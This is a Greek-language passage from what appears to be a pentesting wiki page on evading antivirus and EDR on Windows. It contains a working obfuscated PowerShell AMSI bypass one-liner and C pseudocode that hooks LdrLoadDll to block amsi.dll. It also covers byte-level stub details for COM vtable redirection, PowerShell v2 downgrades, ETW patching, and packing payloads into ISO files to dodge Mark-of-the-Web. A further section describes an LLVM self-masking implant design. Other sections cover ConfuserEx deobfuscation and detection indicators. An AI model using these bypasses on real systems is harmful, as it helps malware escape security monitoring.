Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό στην τρέχουσα διεργασία powershell. Αυτή η γραμμή έχει, φυσικά, επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Λάβετε υπόψη ότι πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν σκοπεύετε να παραμείνετε αόρατοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των εισόδων που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

### Ανακατεύθυνση του δείκτη σάρωσης του AMSI COM αντί για patching του `AmsiScanBuffer`

Μια άλλη process-local παράκαμψη αφήνει ανέπαφο το entry point του `AmsiScanBuffer`. Στον αναφερόμενο 64-bit .NET loader, δημιουργείται ένα αντικείμενο AMSI COM από το CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`. Η `Marshal.GetIUnknownForObject()` επιστρέφει τον δείκτη διεπαφής και η θέση του vtable με offset `0x18` χρησιμοποιείται ως στόχος της κλήσης σάρωσης. Ο loader τροποποιεί έναν native δείκτη για το `Console.Clear()` με ένα μικρό x64 stub, αλλάζει την καταχώριση του vtable ώστε να δείχνει στο stub μέσω της `VirtualProtect()` και, στη συνέχεια, επαναφέρει την αρχική προστασία σελίδας. Απαραίτητες προϋποθέσεις είναι το πλάτος δείκτη 64-bit και η αναμενόμενη διάταξη COM· αυτό δεν είναι ένα γενικό offset για αυθαίρετες διεπαφές ή εκδόσεις AMSI. Τα στάδια που παρατηρήθηκαν προηγουμένως είναι η [φόρτωση signed AppDomainManager sidecar](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) και η [αποσειριοποίηση RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Τα παρατηρημένα bytes του stub είναι `41 C7 00 01 00 00 00 33 C0 C3`: γράφουν **1** στον δείκτη αποτελέσματος στο `r8` και επιστρέφουν **0** στο `eax`. Επομένως, ο αναφερόμενος ισχυρισμός ότι το αποτέλεσμα της σάρωσης είναι `AMSI_RESULT_CLEAN` (0) συγχέει την τιμή επιστροφής `S_OK` με το enum εξόδου. Στην τεκμηριωμένη σειρά του `AMSI_RESULT`, το αποτέλεσμα **1** είναι `AMSI_RESULT_NOT_DETECTED`· εξακολουθεί να είναι κάτω από το όριο ανίχνευσης.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Αποκλεισμός του AMSI εμποδίζοντας τη φόρτωση του amsi.dll (hook στο LdrLoadDll)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική, ανεξάρτητη από τη γλώσσα παράκαμψη είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για αυτήν τη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και προσαρμοσμένους loaders (οτιδήποτε θα φόρτωνε διαφορετικά το AMSI).
- Συνδυάστε το με την αποστολή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης scripts για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης scripts για παράκαμψη του AMSI, τα οποία αποφεύγουν τις υπογραφές μέσω τυχαιοποιημένων συναρτήσεων που ορίζει ο χρήστης, μεταβλητών και εκφράσεων χαρακτήρων, ενώ εφαρμόζουν τυχαία χρήση κεφαλαίων και πεζών γραμμάτων στις λέξεις-κλειδιά του PowerShell για να αποφύγουν τις υπογραφές.

**Αφαιρέστε την υπογραφή που εντοπίστηκε**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, για να αφαιρέσετε την υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο σαρώνει τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και, στη συνέχεια, την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε την έκδοση 2 του PowerShell**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή του PowerShell είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση της έκδοσης 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει τους ελέγχους που σχετίζονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Συσκότιση

> [!TIP]
> Αρκετές τεχνικές συσκότισης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ίσως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να αποκρυφτούν.

### Αποσυσκότιση .NET Binaries με προστασία ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να αντιμετωπίζετε πολλά επίπεδα προστασίας που εμποδίζουν decompilers και sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο στη συνέχεια μπορεί να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση του Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Επίσης, τροποποιεί το PE checksum, ώστε οποιαδήποτε αλλαγή να προκαλέσει crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα κλειδιά XOR και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Το output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες όταν δημιουργείτε τον δικό σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *καθαρό* αρχείο στο **de4dot-cex** (ένα fork του de4dot με υποστήριξη για ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Σημαίες:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy-call – το ConfuserEx αντικαθιστά τις απευθείας κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation.  Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά το malware το αποθηκεύει ως πίνακα byte κωδικοποιημένο σε TLV, ο οποίος αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε σταθμό εργασίας χωρίς σύνδεση.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη αρχική διαλογή δειγμάτων.

#### Μία γραμμή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), που προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά το compile time, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, που παράγονται από το C++ template metaprogramming framework, κάνοντας τη ζωή όποιου προσπαθεί να κάνει crack στην εφαρμογή λίγο δυσκολότερη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας obfuscator δυαδικών αρχείων x64, που μπορεί να κάνει obfuscate διάφορα αρχεία PE, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός μηχανισμός metamorphic code για αυθαίρετα εκτελέσιμα αρχεία.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly, μετατρέποντας τις κανονικές εντολές σε αλυσίδες ROP και ανατρέποντας τη φυσική μας αντίληψη για την κανονική ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### Αυτομάσκα σε επίπεδο συνάρτησης με τη βοήθεια του compiler LLVM

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όταν βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες συναρτήσεις σε XOR-masked μορφή όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει απο-mangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό κώδικα μηχανής και εκπέμπει έναν κοινό handler masking στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η calling convention των Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά την επιλογή εντολών και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε return που εκπέμπεται** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο προσαρτημένο epilogue και αντικαθιστά τα προηγούμενα returns με `JMP_1 handler`. Διατηρήστε κάθε teardown της στοίβας/frame που έχει δημιουργήσει ο compiler πριν από κάθε return· ανακατευθύνετε μόνο την ίδια την εντολή return.<sup>[[38]](#references)[[39]](#references)</sup>

Τα `X86AsmPrinter::emitFunctionBodyStart()` και `emitFunctionBodyEnd()` εκπέμπουν τα stubs κάθε συνάρτησης, ενώ το `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που χρησιμοποιούνται σε κοινά στάδια εκπομπής επιτρέπουν σε έναν κλάδο prologue να στοχεύει το μεταγενέστερο epilogue· για ένα χειροκίνητα εκπεμπόμενο near `je`, γράψτε `0F 84` και έπειτα την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα jumps προς τον handler μπορούν εναλλακτικά να εκπέμπονται ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση όταν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση pre-CRT

Το PoC τοποθετεί ένα XOR key και εγγραφές 16 byte που περιέχουν έναν δείκτη συνάρτησης με relocation από τον loader, καθώς και ένα runtime μήκος, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στη μετατόπιση εγγραφής `+8`, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές ανά `0x10`. Τα ονόματα των PE sections έχουν μήκος μόνο οκτώ byte, οπότε η αναζήτηση κατά το runtime βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό entry-point RVA στο stub και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub λαμβάνει τη βάση της εικόνας από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα imports του PE32+ για να επιλύσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει έναν sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση του metadata. Το μόνιμα αναγνώσιμο prologue καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει τον sentinel και παραλείπει το σώμα που παραμένει σε clear μορφή. Στη συνέχεια, το epilogue χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` byte), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της συνάρτησης που μετασχηματίστηκε, οπότε το `end - start` μπορεί να εγγραφεί στην εγγραφή metadata. Το stub εκκαθαρίζει τον sentinel και μεταβαίνει στο `ImageBase + original_entry_point_RVA`, αφού γίνει masking σε όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή καταλήγει στο προσαρτημένο epilogue, ενώ κάθε προηγούμενο return κάνει jump κατευθείαν στον κοινό handler. Το κανονικό epilogue χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε μετά το re-masking, το `ret` του handler να καταναλώσει τη διεύθυνση επιστροφής του αρχικού caller και να διατηρήσει το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (μήκους `0x46` byte σε αυτό το build), αλλάζει την υπόλοιπη περιοχή σε `PAGE_EXECUTE_READWRITE`, κάνει XOR byte προς byte με το χαμηλό byte του key και στη συνέχεια την ορίζει σε `PAGE_EXECUTE_READ`. Έτσι, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά την κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Ενδείξεις υψηλής αξιοπιστίας για αυτόν τον σχεδιασμό είναι οι εξής:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και ενότητα `.funcmet` που περιέχει ένα key μαζί με relocated δείκτες προς το `.text`·
- parsing των PEB, import table και section table πριν από το CRT, και στη συνέχεια κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες μεταβάσεις `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από την εικόνα.

Πρόκειται για αποφυγή memory scanner, όχι για κρυπτογραφική προστασία: το τροποποιημένο αρχείο εξακολουθεί να περιέχει το αρχικό σώμα σε clear μορφή, ενώ ένας debugger μπορεί να κάνει break στο `VirtualProtect` ή στον βρόχο XOR και να αποθηκεύσει την ενεργή συνάρτηση. Το XOR ενός byte, το αναγνώσιμο metadata και το σταθερό όριο `0x46` κάνουν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα TEB slots του PoC είναι thread-local, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές για όλη τη διεργασία. Επομένως, παράλληλη ή αναδρομική είσοδος μπορεί να αλλάξει ξανά την κατάσταση των εντολών ενώ εκτελείται άλλη κλήση· οι εξαιρέσεις και οι μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις μεταβάσεις, να επαναφέρει την προστασία που επιστράφηκε μέσω του `lpflOldProtect`, να αποφεύγει hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` για στοίχιση της στοίβας x64 και να καλεί το `FlushInstructionCache` αφού τροποποιήσει εκτελέσιμα byte. Η Microsoft δηλώνει ρητά ότι ο caller είναι υπεύθυνος για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως να έχετε δει αυτήν την οθόνη όταν κατεβάζετε ορισμένα εκτελέσιμα αρχεία από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη, πράγμα που σημαίνει ότι εφαρμογές που δεν έχουν κατεβεί συχνά θα ενεργοποιήσουν το SmartScreen, προειδοποιώντας και εμποδίζοντας τον τελικό χρήστη να εκτελέσει το αρχείο (αν και μπορεί ακόμη να το εκτελέσει πατώντας More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS ενός αρχείου που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία που είναι υπογεγραμμένα με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να μην αποκτούν τα payloads σας Mark of The Web είναι να τα συσκευάζετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε τόμους **που δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου, ώστε να αποφεύγεται το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με συσκευασία payloads μέσα σε αρχεία ISO, χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει στις εφαρμογές και τα στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως είναι δυνατό να απενεργοποιηθεί (να παρακαμφθεί) το AMSI, έτσι είναι επίσης δυνατό να ρυθμιστεί η συνάρτηση **`EtwEventWrite`** της διεργασίας user space ώστε να επιστρέφει αμέσως, χωρίς να καταγράφει κανένα συμβάν. Αυτό γίνεται με patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflection C# Assembly

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί εξαιρετικό τρόπο εκτέλεσης των post-exploitation εργαλείων σας χωρίς να εντοπιστούν από το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να φροντίσουμε μόνο για το patching του AMSI σε ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει **τη δημιουργία μιας νέας sacrificial διεργασίας**, την έγχυση του κακόβουλου post-exploitation κώδικά σας σε αυτή τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι, αν κάτι πάει στραβά κατά τη post-exploitation ενέργειά μας ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας**. Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

